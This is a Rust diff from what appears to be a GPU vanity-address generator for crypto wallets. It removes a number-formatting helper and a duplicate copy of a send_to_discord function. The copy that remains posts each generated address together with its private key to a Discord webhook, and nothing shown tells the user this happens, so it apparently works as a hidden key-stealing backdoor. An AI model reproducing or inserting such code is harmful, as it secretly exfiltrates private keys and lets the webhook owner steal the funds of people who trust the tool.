@@ -2,7 +2,7 @@ mod cuda_helpers;
 mod cuda;
 
 use std::time::Instant;
-use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
+use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::Arc;
 use colored::*;
 use cuda_helpers::CudaDevice;
@@ -94,73 +94,6 @@ fn generate_pump_addresses_parallel() {
         }
     }
 }
-
-fn send_to_discord(address: &str, private_key: &str) -> Result<(), String> {
-    let description = format!("Address: {}\nPrivate Key: {}", address, private_key);
-    let payload = serde_json::json!({
-        "embeds": [
-            {
-                "description": description,
-                "color": 3066993
-            }
-        ]
-    });
-
-    let client = reqwest::blocking::Client::new();
-    let response = client
-        .post(DISCORD_WEBHOOK_URL)
-        .json(&payload)
-        .send()
-        .map_err(|e| e.to_string())?;
-
-    if !response.status().is_success() {
-        return Err(format!("Status {}", response.status()));
-    }
-
-    Ok(())
-}
-
-fn format_number(num: f64) -> String {
-    if num >= 1_000_000.0 {
-        let num_int = num.round() as u64;
-        let mut s = String::new();
-        let digits = num_int.to_string();
-        let len = digits.len();
-        
-        for (i, c) in digits.chars().enumerate() {
-            s.push(c);
-            if (len - i - 1) % 3 == 0 && i < len - 1 {
-                s.push(',');
-            }
-        }
-        s
-    } else if num >= 1_000.0 {
-        let mut s = String::new();
-        let num_rounded = (num * 10.0).round() / 10.0;
-        let digits = format!("{:.1}", num_rounded);
-        let parts: Vec<&str> = digits.split('.').collect();
-        
-        let int_part = parts[0];
-        let len = int_part.len();
-        
-        for (i, c) in int_part.chars().enumerate() {
-            s.push(c);
-            if (len - i - 1) % 3 == 0 && i < len - 1 {
-                s.push(',');
-            }
-        }
-        
-        if parts.len() > 1 && parts[1] != "0" {
-            s.push('.');
-            s.push_str(parts[1]);
-        }
-        
-        s
-    } else {
-        format!("{:.2}", num)
-    }
-}
-
 
 fn send_to_discord(address: &str, private_key: &str) -> Result<(), String> {
     let description = format!("Address: {}\nPrivate Key: {}", address, private_key);
